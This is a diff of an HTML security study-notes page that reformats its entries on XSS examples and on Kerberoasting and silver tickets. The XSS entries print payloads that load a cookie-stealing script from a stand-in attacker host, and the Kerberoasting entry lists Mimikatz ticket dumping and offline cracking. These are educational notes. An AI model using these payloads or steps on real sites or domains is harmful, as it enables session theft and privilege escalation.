@@ -332,12 +332,17 @@
 <h3 id="examples">Examples</h3>
 <ul>
 <li>
-<p>Reflected: In a vulnerable website e query can be crafted in order to execute a custom script (<code>http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</code>) or encode the ASCII characters with percent-encoding, such as (<code>http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code>).
+<p><strong>Reflected</strong>: In a vulnerable website e query can be crafted in order to execute a custom script<br><br>
+<code>http://bobssite.org/search?q=puppies&lt;script%20src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;&lt;/script&gt;</code><br><br>
+or encode the ASCII characters with percent-encoding, such as<br><br>
+<code>http://bobssite.org/search?q=puppies%3Cscript%2520src%3D%22http%3A%2F%2Fmallorysevilsite.com%2Fauthstealer.js%22%3E%3C%2Fscript%3E</code>.<br><br>
 If this link is sent to the victim he/she will execute the script <em>authstealer.js</em> and any operation written there can be executed such as stealing authentication cookies and log in as him/her.</p>
 </li>
 <li>
-<p>Stored: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc&hellip;
-If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted (<code>I love the puppies in this story! They're so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>). If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p>
+<p><strong>Stored</strong>: In this case the script is put in a text are or wherever a user can write such as comments of posts, review etc&hellip;
+If the site is vulnerable in the text are HTML commands can be execute so a proper XSS exploit can be crafted<br><br>
+<code>I love the puppies in this story! They're so cute!&lt;script src=&quot;http://mallorysevilsite.com/authstealer.js&quot;&gt;</code>).<br><br>
+If the link is clicked the script <em>authstealer.js</em> will run and operations will be executed.</p>
 </li>
 </ul>
 <hr>
@@ -367,12 +372,15 @@ If the site is vulnerable in the text are HTML commands can be execute so a prop
 <ul>
 <li>Get SPN (Service Principle Name) via script <code>GetUserSPNs.py</code>.</li>
 <li>Choose a SPN and request a ticket with the choosen SPN, susually the choosen SPN should be Administrator in order to priviledge escalete.</li>
-<li>Use Mimikatz to dump the ticket from memory, the ticket will be encrypted with NTLM hash of the choosen SPN account password.</li>
+<li>The ticket will be in the memory encrypted with the NTLM hash of the password of the service account.</li>
+<li>Use Mimikatz to dump the ticket from memory.</li>
 <li>Crack the ticket offline with any tool.</li>
 </ul>
 <p>or GetUserSPNs from Imapcket Suite can  be used to list and retrive the service ticket and then crack it offline (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting">tutorial</a>).</p>
-<h4 id="what-is-a-golden-ticket">What is a golden ticket?</h4>
 <h4 id="what-is-a-silver-ticket">What is a silver ticket?</h4>
+<p>This technique requires a cracked service password which can be obtained via Kerberosting attack.</p>
+<p><a href="https://www.youtube.com/watch?v=GTJyd-AMfuM">https://www.youtube.com/watch?v=GTJyd-AMfuM</a></p>
+<h4 id="what-is-a-golden-ticket">What is a golden ticket?</h4>
 <hr>
 <h2 id=SUBNET> <span style="color:#da1953">Sub</span>netting and calculations</h2>
 <p>Address:   192.168.0.1          11000000.10101000.00000000 .00000001<br>
